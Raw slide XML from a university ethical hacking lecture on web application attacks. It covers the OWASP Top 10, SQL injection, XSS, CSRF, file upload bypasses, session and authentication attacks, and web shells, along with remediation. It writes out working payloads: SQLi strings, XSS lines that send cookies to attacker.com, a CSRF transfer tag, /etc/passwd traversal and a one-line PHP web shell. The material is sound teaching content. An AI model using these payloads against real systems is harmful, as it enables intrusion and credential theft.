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ITC Avant Garde Gothic" charset="1" panose="020B0502020202020204"/>
      <p:regular r:id="rId31"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="TT Fors" charset="1" panose="020B0003030001020000"/>
      <p:regular r:id="rId32"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="TT Fors Bold" charset="1" panose="020B0003030001020000"/>
      <p:regular r:id="rId37"/>
    </p:embeddedFont>
    <p:embeddedFont>
      <p:font typeface="Courier New Bold" charset="1" panose="020706090202050204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59" Target="notesSlides/notesSlide23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https://owasp.org/www-project-web-security-testing-guide/" TargetMode="External" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink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7675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0559" t="0" r="-9055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62648" y="7828295"/>
            <a:ext cx="3328824" cy="1791955"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="4438432" cy="23892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89273" cy="238927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49159" y="0"/>
              <a:ext cx="2389273" cy="2389273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01359" y="339351"/>
              <a:ext cx="1586555" cy="1710572"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="1710572" w="1586555">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1586555" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1586555" y="1710571"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1710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399244" y="555945"/>
              <a:ext cx="1689102" cy="1277384"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="1277384" w="1689102">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1689102" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1689102" y="1277383"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="127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1552575"/>
            <a:ext cx="11210925" cy="406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2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Advanced Web Application Attacks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561975"/>
            <a:ext cx="976312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MULTIMEDIA UNIVERSITY, MALAYSIA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474" y="5973445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CCS6324 - 2530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3474" y="5492749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ETHICAL HACKING AND PENETRATION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Dr. Hafiz Adnan Hussain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132867"/>
            <a:ext cx="16592550" cy="65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This course is designed to educate students on ethical hacking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ples. The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echniques acqu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ed must be used respons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 and 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llegal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 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authorized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activiti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Each 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nt is solely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 not inv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estig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in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ividua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s, webs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es,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servers or conduct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ill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 activit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you do not have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ion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 analyze.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conten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been deve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oped in good f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h, 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awing from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r’s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rience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table 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 Wh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 every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 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been made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ure accuracy,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uthor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guarante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ute correctness. Students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courage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ex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discretio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actively engage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 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que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tions or conc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ng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DISC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AIMER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2551174"/>
            <a:ext cx="16954500" cy="226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3" indent="-259082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Top 10 vulnerabilities in depth</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="518163" indent="-259082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Multiple injection attack types</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="518163" indent="-259082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Session and authentication mechanisms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="518163" indent="-259082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File upload security considerations</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="518163" indent="-259082" lvl="1">
              <a:lnSpc>
                <a:spcPts val="3600"/>
              </a:lnSpc>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/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Defense mechanisms and remediation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7147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Learning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95500"/>
            <a:ext cx="1298378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Y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ou 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ll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ea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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="true" sz="2600" spc="-78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54544" y="5334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1. OWASP Top 10 Vulnerabilities - Deep Dive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2004060"/>
            <a:ext cx="171069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OWASP Top 10 is a standard awareness document for developers and web application security. It represents a broad consensus about the most critical security risks to web applications organizations face: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937510"/>
            <a:ext cx="10274021" cy="482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A01:2025 - Broken Access Control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A02:2025 - Security Misconfiguration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A03:2025 - Software Supply Chain Failures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A04:2025 - Cryptographic Failures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A05:2025 - Injection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A06:2025 - Insecure Design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A07:2025 - Authentication and Session Management Failures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A01:2025 - Software and Data Integrity Failures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A09:2025 - Security Logging and Alerting Failures</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3899"/>
              </a:lnSpc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A10:2025 - Mishandling of Exceptional Conditions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13315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Current OWASP Top 10 (2025)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8189875"/>
            <a:ext cx="16954500" cy="1699261"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="4465332" cy="4475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65332" cy="447553"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="447553" w="4465332">
                  <a:moveTo>
                    <a:pt x="4465332" y="9133"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4465332" y="438421"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="4465332" y="440843"/>
                    <a:pt x="4464370" y="443166"/>
                    <a:pt x="4462657" y="444878"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="4460944" y="446591"/>
                    <a:pt x="4458622" y="447553"/>
                    <a:pt x="4456200" y="447553"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="9133" y="447553"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="6710" y="447553"/>
                    <a:pt x="4388" y="446591"/>
                    <a:pt x="2675" y="444878"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="962" y="443166"/>
                    <a:pt x="0" y="440843"/>
                    <a:pt x="0" y="438421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lnTo>
                    <a:pt x="4456200" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="4458622" y="0"/>
                    <a:pt x="4460944" y="962"/>
                    <a:pt x="4462657" y="2675"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="4464370" y="4388"/>
                    <a:pt x="4465332" y="6710"/>
                    <a:pt x="4465332" y="9133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465332" cy="48565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60"/>
                </a:lnSpc>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="2400" spc="-7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numbering follows the official OWASP Top 10 (2021) ranking system, which is the industry standard for web application security vulnerabilities, based on Risk-Based Ranking and Practical Values, where A01 means Most Critical Risk and A10 means Still critical but less prevalent than A01. More details are here: https://owasp.org/www-project-top-ten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1. OWASP Top 10 Vulnerabilities - Deep Dive Analysis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62341"/>
            <a:ext cx="17106900" cy="836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A01:2025 - Broken Access Control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Users can access data/actions they shouldn’t, because authorization checks are missing or weak.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ndard forms: IDOR, horizontal/vertical privilege escalation, bypassing /admin routes, forced browsing.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This o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ften happens when apps trust client-side roles/IDs (e.g., URL parameters, JWT claims, hidden fields).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Changing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/api/user/123/profile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→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/api/user/456/profile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 viewing someone else’s profile.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A02:2025 - Security Misconfiguration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settings are left default, incomplete, or wrong across server/app/cloud (debug mode, open admin panels, weak headers).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Exposes internal info (stack traces), enables risky features (directory listing), or allows unsafe cross-origin access (CORS).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Usually caused by poor hardening + inconsistent environments (dev vs prod).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Production site exposes /debugs and shows environment variables + database credentials.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A03:2025 - Software Supply Chain Failures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Attacks enter through dependencies, build pipelines, packages, or third-party services you trust.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Includes malicious packages (typosquatting), compromised updates, leaked CI/CD secrets, and unverified artifacts.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Hard to detect because it comes from “trusted” sources.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 developer installs react-secure (a similar name), which secretly steals API keys during the build.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A04:2025 - Cryptographic Failures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Sensitive data is exposed due to weak/misused encryption, missing TLS, poor key management, or poor password storage.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Includes using outdated algorithms (MD5/SHA1), no salt, weak tokens, and hardcoded keys.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Leads to account takeover and data leaks even without “hacking” the app logic.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Passwords stored as plain MD5 hashes → attacker cracks them quickly after DB leak.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Current OWASP Top 10 (2025) (Cont’d)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1. OWASP Top 10 Vulnerabilities - Deep Dive Analysis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252719"/>
            <a:ext cx="17106900" cy="878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A05:2025 - Injection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Attackers inject malicious input into SQL/NoSQL/OS commands/LDAP/XML, and the server executes it.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Happens when input is concatenated into queries/commands instead of using safe APIs (prepared statements).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result in data theft, modification, or full server takeover.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Login field input admin' OR '1'='1 bypasses authentication in a vulnerable SQL query.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A06:2025 - Insecure Design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system is designed without security in mind, so flaws persist even if the code is “clean.”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Missing threat modeling, insecure workflows, weak recovery logic, no rate limits, unsafe defaults.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Fixing requires a redesign, not just patching a single function.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Password reset links valid for 30 days with no rate limiting → easy takeover via email compromise.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A07:2025 - Authentication Failures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Weak authentication allows attackers to steal or guess credentials (e.g., via brute-force attacks, reset flaws, session issues, or OAuth mistakes).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Includes weak passwords, no lockout/rate limit, username enumeration, insecure MFA, and bad JWT validation.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Leads to impersonation and privilege abuse.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App returns “User not found” vs “Wrong password” → attacker enumerates valid emails.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A08:2025 - Software or Data Integrity Failures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Data/software can be modified without detection (e.g., via tampered updates, unsigned artifacts, or unsafe deserialization).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Often involves untrusted inputs being treated as trusted objects or updates.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Leads to malware injection or silent data corruption.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 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 downloads updates over HTTP with no signature check → attacker swaps update with a backdoored version.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1. OWASP Top 10 Vulnerabilities - Deep Dive Analysis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668526"/>
            <a:ext cx="17106900" cy="417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A09:2025 -Security Logging and Alerting Failures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Attacks happen, but you don’t notice them or can’t investigate properly because of missing/weak logs and alerts.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alerts on brute force, no logging of sensitive actions, logs overwritten too quickly, or logs can be tampered.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Makes incident response slow and causes more damage.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5,000 failed logins from one IP in 10 minutes, but no alert is triggered, and logs rotate daily.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A10:2025 - Mishandling of Exceptional Conditions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Errors/exceptions are handled unsafely, leading to information leaks, crashes, bypasses, or DoS attacks.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Includes verbose stack traces, null-handling bugs, type confusion, resource exhaustion, and unclosed connections.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Attackers exploit edge cases to break logic or overload services.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The app shows the full stack trace and the SQL query on error, revealing table names and file paths.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075010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Current OWASP Top 10 (2025) (Cont’d)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8608975"/>
            <a:ext cx="16954500" cy="1280161"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="4465332" cy="3371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32" cy="337170"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="337170" w="4465332">
                  <a:moveTo>
                    <a:pt x="4465332" y="9133"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="4465332" y="328038"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="4465332" y="330460"/>
                    <a:pt x="4464370" y="332783"/>
                    <a:pt x="4462657" y="334495"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="4460944" y="336208"/>
                    <a:pt x="4458622" y="337170"/>
                    <a:pt x="4456200" y="337170"/>
                  </a:cubicBezTo>
                  <a:lnTo>
                    <a:pt x="9133" y="337170"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="6710" y="337170"/>
                    <a:pt x="4388" y="336208"/>
                    <a:pt x="2675" y="334495"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="962" y="332783"/>
                    <a:pt x="0" y="330460"/>
                    <a:pt x="0" y="328038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lnTo>
                    <a:pt x="4456200" y="0"/>
                  </a:lnTo>
                  <a:cubicBezTo>
                    <a:pt x="4458622" y="0"/>
                    <a:pt x="4460944" y="962"/>
                    <a:pt x="4462657" y="2675"/>
                  </a:cubicBezTo>
                  <a:cubicBezTo>
                    <a:pt x="4464370" y="4388"/>
                    <a:pt x="4465332" y="6710"/>
                    <a:pt x="4465332" y="9133"/>
                  </a:cubicBezTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="CC4E0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65332" cy="37527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 spc="-7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Application fetches remote resources without validating URLs</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:pPr algn="l" marL="518166" indent="-259083" lvl="1">
                <a:lnSpc>
                  <a:spcPts val="3360"/>
                </a:lnSpc>
                <a:buFont typeface="Arial"/>
                <a:buChar char="•"/>
              </a:pPr>
              <a:r>
                <a:rPr lang="en-US" sz="2400" spc="-72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Can access internal systems or perform actions as the application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2. SQL Injection Attacks - Deep Technical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2004060"/>
            <a:ext cx="171069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SQL injection occurs when an attacker inserts malicious SQL code into entry fields, manipulating backend database queries.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575560"/>
            <a:ext cx="1027402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Vulnerable Code Example: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3141345"/>
            <a:ext cx="17106900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spc="-69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$username = $_POST['username'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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$password = $_POST['password'];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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$result = mysqli_query($conn, $query);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3450"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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 attacker entering </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-6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admin' --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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as username creates: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-6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SELECT * FROM users WHERE username='admin' --' AND password='...'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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The </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-6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--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2300" spc="-69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comments out the password check.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13315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2.1 Attack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2. SQL Injection Attacks - Deep Technical Analysis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2004060"/>
            <a:ext cx="11817891" cy="459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In-band SQLi (Error-based &amp; Union-based)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receives direct results thro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ugh the application interface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Error-based: Using database error messages to extract information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Union-based: Combining results from multiple SELECT queries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Blind SQLi (Time-based &amp; Boolean-based)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direct output visible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Boolean-based: Using true/false conditions to infer data (e.g.,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 AND 1=1 --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Time-based: Using SLEEP() or DELAY() to measure response times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Out-of-band SQLi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Using alternative channels like DNS or HTTP to extract data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Example: Database writing data to an external server via DNS queries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3315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2.2 Classification of SQL Injection Attacks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2. SQL Injection Attacks - Deep Technical Analysis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2004060"/>
            <a:ext cx="11817891" cy="501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Manual Testing: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Inpu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 single quo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te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trigger SQL errors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Test logic operators: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 OR '1'='1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comment sequences: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--, /**/, #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Utilize UNION SELECT to extract column information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UNION-based Attack Steps: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Determine number of columns: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 UNION SELECT NULL,NULL,NULL --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data types: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 UNION SELECT 1,'string',3 --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Extract sensitive data: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 UNION SELECT version(),user(),database() --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Time-based Blind SQLi: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'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AND IF(1=1, SLEEP(5), 0) --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AND SLEEP(5) WHERE 1=1 --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1331595"/>
            <a:ext cx="8306267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b="true" sz="2599" spc="-77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2.3 Detection and Exploitation Techniques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2. SQL Injection Attacks - Deep Technical Analysis (Cont’d)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305256"/>
            <a:ext cx="11817891" cy="47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2.4 Automated Tools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SQLMap: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Automa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ted SQL injection testing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Burp Suite Scanner: Identifies injection points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ZAP: Community-based vulnerability scanner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2.5 Remediation Strategies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parameterized queries/prepared statements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input validation and whitelist acceptable characters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Apply the principle of least privilege to database accounts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stored procedures with input validation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Enable Web Application Firewall (WAF) rules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3. Cross-Site Scripting (XSS) - All Variants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106458"/>
            <a:ext cx="16992910" cy="897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3.1 XSS Fundamentals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XSS allows attackers to inject m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alicious JavaScript code executed in victims' browsers.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Impact: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Session hijacking and cookie theft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Credential harvesting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Malware distribution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Defacement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Redire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ct to phishing sites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3.2 Reflected XSS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 m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alicious script is part of the request URL or data and is reflected immediately in the response.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Vector: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ttps://vulnerable.com/search.php?q=&lt;script&gt;alert('XSS')&lt;/script&gt;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application reflects user input without sanitization: You searched for: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&lt;script&gt;alert('XSS')&lt;/script&gt;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Cookie Stealing Payload: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&lt;script&gt;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new Image().src='http://attacker.com/steal.php?cookie='+document.cookie;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&lt;/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script&gt;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3. Cross-Site Scripting (XSS) - All Variants (Cont’d)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431833"/>
            <a:ext cx="8022215" cy="674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3.3 Stored XSS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Malicious script is stored in the database and executed when other users view the content.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Common Locations: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profile descriptions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Forum comments and posts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Product reviews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Chat messages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Flow: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posts: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&lt;img src=x onerror="fetch('http://attacker.com/?cookie='+document.cookie)"&gt;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Stored in the database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Every user viewing the post executes a malicious script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1431833"/>
            <a:ext cx="8200979" cy="604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3.4 DOM-based XSS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V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ulnerability exists in client-side JavaScript code.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Vulnerable Code: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var userName = location.hash.substring(1);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ocument.getElementById('greeting').innerHTML = 'Welcome ' + userName;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Exploi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tation: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ttp://vulnerable.com/page.html#&lt;img src=x onerror="alert('XSS')"&gt;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Modern DOM XSS Vectors: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location.href, location.hash, document.URL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innerHTML, document.write()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Event handlers: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onerror, onload, onclick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3. Cross-Site Scripting (XSS) - All Variants (Cont’d)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431833"/>
            <a:ext cx="8022215" cy="842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3.5 XSS P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ayloads for Different Contexts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HTML Context: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&lt;img src=x onerror="alert('XSS')"&gt;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&lt;svg onload="alert('XSS')"&gt;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&lt;ifra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me src="javascript:alert('XSS')"&gt;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JavaScript Context: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';alert('XSS');//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"+ale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rt('XSS')+"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Event Handler Bypass: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svg onload=alert(String.fromCharCode(88,83,83))&gt;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&lt;img src=x onerror=eval(atob('YWxlcnQoJ1hTUycpOw=='))&gt;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tribute Bypass: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&lt;img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<![CDATA[ src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">]]>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&lt;svg/onload=alert('XSS')&gt;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1431833"/>
            <a:ext cx="8200979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3.6 XSS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Detection an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Prevention</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc>
            </a:pP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Content Security Policy (CSP) headers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output encoding based on context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security-focused templating engines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Regular security testing and code review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Browser security features: X-XSS-Protection, X-Frame-Options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4. Cross-Site Request Forgery (CSRF)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431833"/>
            <a:ext cx="8217230" cy="716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4.1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Atta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ck Mechanics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CSRF tricks authenticated users into performing unwanted actions on trusted sites.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Scenario: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logs into online banking (bank.com)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visits the attacker's website without logging out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Attacker's site contains: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&lt;img src="bank.com/transfer?amount=1000&amp;to=attacker"&gt;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User's browser automatically includes authentication cookies</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="474981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Unauthorized transfer occurs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4.2 Prerequisites for Successful CSRF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v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ictim must be authenticated on the target site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Application must rely only on cookies for session management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unpredictable tokens or headers verify requests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SameSite cookie attribute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1431833"/>
            <a:ext cx="8200979" cy="549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4.3 CSRF Token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Implementation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Mo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ern applications u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 CSRF tokens to prevent attacks.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Token Requirements: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Unique per session or per request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Cryptographically random (128-bit minimum)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Stored securely (not in cookies)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Validated on the server-side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Vulnerable Token Issues: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Tokens in GET parameters (logged in browser history)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Tokens not validated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Tokens are not invalidated after use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Duplicate tokens across users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4. Cross-Site Request Forgery (CSRF) (Cont’d)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431833"/>
            <a:ext cx="8022215" cy="632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4.4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CSRF To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ken Bypass Techniques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Null Token Bypass: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Remove the token parameter entirely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 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erver may not validate missing tokens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Token Fixation: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sets predictable token value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 acts with the attacker's token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repeats action with the same token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oken Extraction via XSS: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XSS vulnerability to steal the CSRF token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a stolen token in a CSRF attack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Double Submit Cookie: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Application reflects the cookie value as a token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knows cookie value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Bypass by setting a custom cookie via a subdomain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1431833"/>
            <a:ext cx="8200979" cy="288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4.5 Co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mprehensiv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 CSRF Prevention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SameSite cookies (Strict/Lax)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unique, unpredictable tokens per request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</a:t>
            </a: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alidate custom headers (X-Requested-With)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</a:t>
            </a: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lement same-site origin validation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599" spc="-77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equire POST for state-changing operations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5. File Upload Vulnerabilities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431833"/>
            <a:ext cx="5161993" cy="80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5.1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Attack Vectors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File upload features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often become avenues for exploitation if not correctly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ecured.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Web Shell Upload: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uploads PHP/ASP/JSP files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Executes arbitrary code on the server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eads to remote code execution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Path Traversal via Upload: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../../../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etc/passwd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....//....//....//etc/passwd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Polyglot Files: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Fil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 containing a valid image and executable code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asses image validation but executes as code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00420" y="1431833"/>
            <a:ext cx="5470767" cy="800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5.2 Validation By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pass Techniques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Fil</a:t>
            </a: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 Extension Bypass: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.php.jpg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(bypasses extension check)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.phtml, .phar, .phps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(executable alternatives)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Ca</a:t>
            </a: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 variation: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.PHP, .PhP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Null byte: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.php%00.jpg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(on older systems)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MIME Type Bypass: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Client-side MIME type easily modified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 trusts Content-Type header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Burp Suite to change Content-Type to image/jpeg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Magic Bytes/File Signature Bypass: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GIF89a&lt;?php system($_GET['cmd']); ?&gt;</a:t>
            </a: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89 50 4E 47 (PNG header) + PHP code</a:t>
            </a:r>
          </a:p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Double Extension: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.jpg.php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(if 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erver processes right-to-left)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.php.jpg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(if .jpg handler misconfigured)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91617" y="1431833"/>
            <a:ext cx="5682033" cy="373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5.3 S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ecur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 Upload Implementation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hitelist allowed file types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alidate file content, not just extension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Store uploads outside web root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Rename files with random names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Implement file size limits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a separate domain for uploads (CDN)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Disable scri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pt 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execution in the upload directory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6. Session Management Attacks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322116"/>
            <a:ext cx="8358435" cy="851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6.1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Session Fixation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Attacker forces user to use attacker-c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ontrolled session ID.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Attack Steps:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="431804" indent="-215902" lvl="1">
              <a:lnSpc>
                <a:spcPts val="30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obtains session ID: PHPSESSID=attackercontrolled123</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="431804" indent="-215902" lvl="1">
              <a:lnSpc>
                <a:spcPts val="30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ends link to victim: login.php?PHPSESSID=attackercontrolled123</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="431804" indent="-215902" lvl="1">
              <a:lnSpc>
                <a:spcPts val="30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Victim logs in</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="431804" indent="-215902" lvl="1">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buAutoNum type="arabicPeriod" startAt="1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Attacker uses same session to access victim's account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Prevention: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Regenerate session ID after login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Inv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alidate old sessions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secure session ID generation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6.2 Session Hijacking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At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tacker steals valid session ID through various methods.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ethods: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etwork sniffing: Capture unencrypted session cookies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XSS attacks: Steal cookies via JavaScript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Brut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force: Guess session IDs with weak randomization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Man-in-the-Middle: Intercept HTTPS traffic (weak certs)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Stolen Cookie Exploitation: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 stolen PHPSESSID to access victim's session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Impersonate user without knowing password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9474" y="1322116"/>
            <a:ext cx="8304176" cy="851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6.3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Cookie Manipulation Techniques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ttpOnly Bypass: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Cookies with HttpOnly cannot be stolen via XSS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But HTTP-only bypass available thr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ough XSS to modify server behavior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cure Flag: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Coo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kies only sent over HTTPS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 be bypassed if application accepts HTTP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SameSite Attribute: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SameSite=Str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ict: Cookies never sent with cross-site requests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Sam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eSite=Lax: Cookies sent only with safe cross-site requests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SameSite=None: Requires Secure flag; sent in all contexts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6.4 Advanced Session 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At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tacks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Session Race Condition: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Send multiple requests simultaneously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erver may process before session state upda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Session Deserialization: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Unsafe deserialization of session data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PHP object injection attacks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Distributed Session Attacks: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ploit session handling across multiple servers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Session fixation on load-balanced infrastructure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7. Authentication and Authorization Bypass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322116"/>
            <a:ext cx="6164515" cy="882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7.1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Authentication Byp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ass Techniques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Credential Enumeration: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Username/email enumerati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on through response differences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assword reset token enumeration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Account existence detection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Weak Password Reset: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Predictable reset tokens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Tokens with long expiration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Tok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ens visible in URLs/email headers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rate limiting on token guessing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efault Credentials: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Admin panels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accessible with admin/admin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Unchanged installation credentials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Publicly documented defaults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Au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thentication Logic Flaws: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if (password == correct_password)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authenticated = t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ru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// Flaw: No username validation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OAu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th/SSO Bypass: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Misconfigured OAuth redirect URIs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State parameter not validated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lient secret exposed in JavaScript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3149" y="1331641"/>
            <a:ext cx="5720226" cy="842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7.2</a:t>
            </a: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Authorization Bypass Techniques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Horizo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ntal Privilege Escalation (IDOR):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Access other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users' data by modifying user ID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/api/user/123/profile → /api/user/124/profile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/download?f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ile=user_123_invoice.pdf → /download?file=user_999_invoice.pdf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Vertic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al Privilege Escalation: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Regular user accesses admin function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ality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ify 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role=user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role=admin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in request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Access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adm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 endpoints without authorization check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Direct Object Refere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nce (IDOR):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GET /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api/v1/documents/1001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(user sees own doc)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GET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/api/v1/documents/1002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(attacker sees another user's doc)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Parameter Manipulation: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POST /admi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n/users/modify?user_id=123&amp;role=admin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Modify to: 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POST /admin/users/modify?user_id=456&amp;role=admin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Path Traversal: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/admin/re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ports → /admin/../../../sensitive_data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/user/profile → /../../admin/users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5260" y="1331641"/>
            <a:ext cx="4978390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7.3 Modern</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2399" spc="-71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Authentication Weaknesses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JWT Vulne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rabi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lities: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Algori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thm confusion (HS256 vs RS256)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on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algorithm bypass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ey extraction from JWT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Exp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ired token a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ccept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nce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Multi-Factor Authentication Bypass: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MFA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 not validated against the user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eak MFA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odes (4-digit PINs)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MFA is disabled without verific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ation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l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Null/em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pty MFA parameter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8. Web Shell Exploitation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322116"/>
            <a:ext cx="6668304" cy="798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8.1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Web Shell B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asics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Uploa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ded script files allowi</a:t>
            </a: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ng remote code execution.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</a:t>
            </a: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imple PHP Web Shell:</a:t>
            </a:r>
          </a:p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&lt;?php system($_GET['cmd']); ?&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" spc="-60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Functionality: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ecute arbitrary system commands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Acc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ess file system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Database manipulation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Lateral movement within the network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8.2 Web Shell Deployment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Upload via file upload vulner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abilities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nject via SQL injection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Deploy through template injection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8.3 We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 Shell Detection and Prevention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Monitor unusual .php/.aspx files in upload directories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heck file modification times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lement Web Application Firewall rules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egular file system scanning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79674" y="1322116"/>
            <a:ext cx="6668304" cy="402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8.2 Web Shell Deployment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Upload via file upload vulner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abilities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nject via SQL injection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Deploy through template injection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8.3 We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 Shell Detection and Prevention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Monitor unusual .php/.aspx files in upload directories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heck file modification times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Imp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lement Web Application Firewall rules</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l" marL="431804" indent="-215902" lvl="1">
              <a:lnSpc>
                <a:spcPts val="3000"/>
              </a:lnSpc>
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/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egular file system scanning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9. Practical Exploitation Workflow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312591"/>
            <a:ext cx="6668304" cy="524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9.1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Re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onnai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ssa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nce Phase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technologies (Wappalyzer, headers)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 application functionality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input points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Analyz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client-side code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9.2 Vulner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ability Ide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ntification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 each input for injection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Check for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authentication weaknesses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Analyze session handling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Review access controls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heck file upload mechanisms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8551" y="1312591"/>
            <a:ext cx="6668304" cy="524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9.3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Expl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oitation Phase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elop proof-of-concept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Document findings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Establish persistence if applic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abl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</a:p>
          <a:p>
            <a:pPr algn="l" marL="474983" indent="-237491" lvl="1">
              <a:lnSpc>
                <a:spcPts val="3300"/>
              </a:lnSpc>
              <a:buAutoNum type="arabicPeriod" startAt="1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Extract sensitive data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9.4 Reporting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Clear vulner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ability des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criptions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Step-by-step reproduction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teps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Business impact assessment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emediation recommendations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everity ratings (CVSS)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02144" y="381000"/>
            <a:ext cx="1471506" cy="792133"/>
            <a:chOff x="0" y="0"/>
            <a:chExt cx="1962007" cy="105617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56178" cy="105617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905830" y="0"/>
              <a:ext cx="1056178" cy="10561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456" lIns="22456" bIns="22456" rIns="22456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77421" y="150010"/>
              <a:ext cx="701336" cy="756158"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="756158" w="701336">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="701336" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="701336" y="756158"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="756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0585" y="245755"/>
              <a:ext cx="746667" cy="564667"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect r="r" b="b" t="t" l="l"/>
              <a:pathLst>
                <a:path h="564667" w="746667">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="746667" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="746667" y="564667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="56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371475"/>
